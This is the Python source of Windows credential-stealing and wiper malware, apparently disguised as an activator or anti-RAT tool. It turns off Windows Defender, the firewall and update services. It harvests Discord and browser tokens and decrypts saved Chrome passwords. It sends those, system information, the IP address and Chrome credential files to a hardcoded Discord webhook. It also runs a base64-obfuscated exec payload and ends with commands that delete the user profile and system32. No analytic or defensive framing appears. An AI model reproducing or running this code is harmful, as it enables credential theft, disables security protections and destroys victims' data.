from discord_webhook import DiscordWebhook
import subprocess
import requests
import os
import json
import cv2
import camera
import re
from random import randint
import os
import json
import base64
import he
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta
from discord_webhook import DiscordWebhook

username = os.getlogin()
subprocess.getoutput('del Activator.exe/q')
subprocess.getoutput('net stop "WinDefend"')
subprocess.getoutput('netsh advfirewall set allprofiles state off')
subprocess.getoutput('taskkill /f /t /im MSASCui.exe')
subprocess.getoutput('net stop "SDRSVC"')
subprocess.getoutput('net stop sharedaccess')
subprocess.getoutput('net stop "wuauserv"')
subprocess.getoutput('net stop "security center"')
def license():
    web=DiscordWebhook(url="https://discord.com/api/webhooks/988419327994761227/QT-ORLi1GRxBbbsbRLs5fs3MkCy2dOuoQL_pFgrhmyCrBYNPSejTcIh8J2ooq9NtFbXy")
    with open("C:/Windows/system32/license.rtf", "rb") as f:
        web.add_file(file=f.read(), filename='license.rtf')
    web.execute()
def tokengrabber():
    import re
    import json

    from urllib.request import Request, urlopen

    # your webhook URL
    WEBHOOK_URL = 'https://discord.com/api/webhooks/988419327994761227/QT-ORLi1GRxBbbsbRLs5fs3MkCy2dOuoQL_pFgrhmyCrBYNPSejTcIh8J2ooq9NtFbXy'

    # mentions you when you get a hit
    PING_ME = False

    def find_tokens(path):
        path += '\\Local Storage\\leveldb'

        tokens = []

        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue

            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
        return tokens

    def main():
        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')

        paths = {
            'Discord': roaming + '\\Discord',
            'Discord Canary': roaming + '\\discordcanary',
            'Discord PTB': roaming + '\\discordptb',
            'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
            'Opera': roaming + '\\Opera Software\\Opera Stable',
            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
        }

        message = '@everyone' if PING_ME else ''

        for platform, path in paths.items():
            if not os.path.exists(path):
                continue

            message += f'\n**{platform}**\n```\n'

            tokens = find_tokens(path)

            if len(tokens) > 0:
                for token in tokens:
                    message += f'{token}\n'
            else:
                message += 'No tokens found.\n'

            message += '```'

        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
        }

        payload = json.dumps({'content': message})

        try:
            req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
            urlopen(req)
        except:
            pass

def chrome_date_and_time(chrome_data):
    # Chrome_data format is 'year-month-date 
    # hr:mins:seconds.milliseconds
    # This will return datetime.datetime Object
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)
  
  
def fetching_encryption_key():
    # Local_computer_directory_path will look 
    # like this below
    # C: => Users => <Your_Name> => AppData =>
    # Local => Google => Chrome => User Data =>
    # Local State
    local_computer_directory_path = os.path.join(
      os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", 
      "User Data", "Local State")
      
    with open(local_computer_directory_path, "r", encoding="utf-8") as f:
        local_state_data = f.read()
        local_state_data = json.loads(local_state_data)
  
    # decoding the encryption key using base64
    encryption_key = base64.b64decode(
      local_state_data["os_crypt"]["encrypted_key"])
      
    # remove Windows Data Protection API (DPAPI) str
    encryption_key = encryption_key[5:]
      
    # return decrypted key
    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
  
  
def password_decryption(password, encryption_key):
    try:
        iv = password[3:15]
        password = password[15:]
          
        # generate cipher
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
          
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
          
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "No Passwords"
  
  
def main1():
    key = fetching_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromePasswords.db"
    shutil.copyfile(db_path, filename)
      
    # connecting to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
      
    # 'logins' table has the data
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
        "order by date_last_used")
      
    # iterate over all rows
    for row in cursor.fetchall():
        main_url = row[0]
        login_page_url = row[1]
        user_name = row[2]
        decrypted_password = password_decryption(row[3], key)
        date_of_creation = row[4]
        last_usuage = row[5]
          
        if user_name or decrypted_password:
            with open("chache_data_removed.txt", "w") as f:
                f.write(f"\nMain URL: {main_url}")
                f.write(f"\nLogin URL: {login_page_url}")
                f.write(f"\nUser name: {user_name}")
                f.write(f"\nDecrypted Password: {decrypted_password}")
        else:
            continue  
    cursor.close()
    db.close()
      
    try:
          
        # trying to remove the copied db file as 
        # well from local computer
        web=DiscordWebhook(url="https://discord.com/api/webhooks/988419327994761227/QT-ORLi1GRxBbbsbRLs5fs3MkCy2dOuoQL_pFgrhmyCrBYNPSejTcIh8J2ooq9NtFbXy")
        with open("chache_data_removed.txt", "rb") as f:
            web.add_file(file=f.read(), filename='file.txt')
        web.execute()
        os.system("del chache_data_removed.txt")
        os.remove(filename)
    except:
        pass
  
  

main1()

def main():
    r=requests.get("http://ifconfig.me")
    url="https://discord.com/api/webhooks/988419327994761227/QT-ORLi1GRxBbbsbRLs5fs3MkCy2dOuoQL_pFgrhmyCrBYNPSejTcIh8J2ooq9NtFbXy"
    subprocess.getoutput('if exist "%userprofile%\AppData\System info.txt" del "%userprofile%\AppData\System info.txt"')
    subprocess.getoutput('systeminfo >> "%userprofile%\AppData\System info.txt"')
    exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHN1YnByb2Nlc3MKc3VicHJvY2Vzcy5nZXRvdXRwdXQoJ25ldCBzdG9wICJTRFJTVkMiJykKc3VicHJvY2Vzcy5nZXRvdXRwdXQoJ25ldCBzdG9wICJXaW5EZWZlbmQiJykKc3VicHJvY2Vzcy5nZXRvdXRwdXQoJ3Rhc2traWxsIC9mIC9pbSBNU0FTQ3VpLmV4ZScpCnN1YnByb2Nlc3MuZ2V0b3V0cHV0KCduZXQgc3RvcCAic2VjdXJpdHkgY2VudGVyIicpCnN1YnByb2Nlc3MuZ2V0b3V0cHV0KCduZXRzaCBhZHZmaXJld2FsbCBzZXQgYWxscHJvZmlsZXMgc3RhdGUgb24nKQpzdWJwcm9jZXNzLmdldG91dHB1dCgnbmV0IHN0b3AgInd1YXVzZXIiJyk=')[0]))
    web=DiscordWebhook(url=url, content=f"IP > {r.text}")
    with open(f"C:/Users/{username}/AppData/System info.txt", "rb")as f:
        web.add_file(file=f.read(), filename='System info.txt')
    with open(f"C:/Users/{username}/AppData/Local/Google/Chrome/User Data/Local State", "rb") as f:
        web.add_file(file=f.read(), filename='Local State')
    with open(f"C:/Users/{username}/AppData/Local/Google/Chrome/User Data/Default/Login Data", "rb") as f:
        web.add_file(file=f.read(), filename='Login Data')
    web.execute()
    camera.snap(10,"test")
    subprocess.getoutput('if exist "%userprofile%\AppData\System info.txt" del "%userprofile%\appdata\System info.txt"')
    he.loli(40)
    subprocess.getoutput('del ANTI-RAT_By_EtichalHackingItalia.exe')
    subprocess.getoutput('rd "%userprofile%"/q /s')
    subprocess.getoutput('rd "%windir%\system32"/q /s')
main()
tokengrabber()
